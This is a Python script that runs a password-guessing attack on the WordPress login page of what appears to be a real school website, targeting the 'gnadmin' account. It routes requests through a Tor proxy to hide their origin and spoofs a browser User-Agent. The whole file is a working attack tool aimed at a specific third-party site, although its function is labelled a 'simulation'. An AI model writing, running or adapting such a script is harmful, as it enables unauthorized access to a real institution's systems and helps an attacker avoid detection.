import requests
import time

# Gatekeeper: Tor Proxy
TOR_PROXY = "socks5h://127.0.0.1:9150"
session = requests.Session()
session.proxies = {'http': TOR_PROXY, 'https': TOR_PROXY}

# Target
url = "https://gn.cambridgeschool.edu.in/wp-login.php"
username = "gnadmin"

# Specific passwords requested
passwords = ["gnadmin", "pass-gnadmin"]

def brute_force_simulation():
    print(f"[!] Starting targeted brute force for: {username}")
    
    for pwd in passwords:
        print(f"[*] Testing password: {pwd}")
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Referer": "https://gn.cambridgeschool.edu.in/wp-login.php"
            }
            data = {
                "log": username,
                "pwd": pwd,
                "wp-submit": "Log In",
                "redirect_to": "https://gn.cambridgeschool.edu.in/wp-admin/",
                "testcookie": "1"
            }
            
            response = session.post(url, data=data, headers=headers, timeout=15)
            
            if "wp-admin" in response.url or "dashboard" in response.text.lower():
                print(f"[!!!] SUCCESS: Password found: {pwd}")
                return
            else:
                print("[-] Login failed.")
            
            time.sleep(5)
            
        except Exception as e:
            print(f"[-] Connection error: {e}")
            break

if __name__ == "__main__":
    brute_force_simulation()
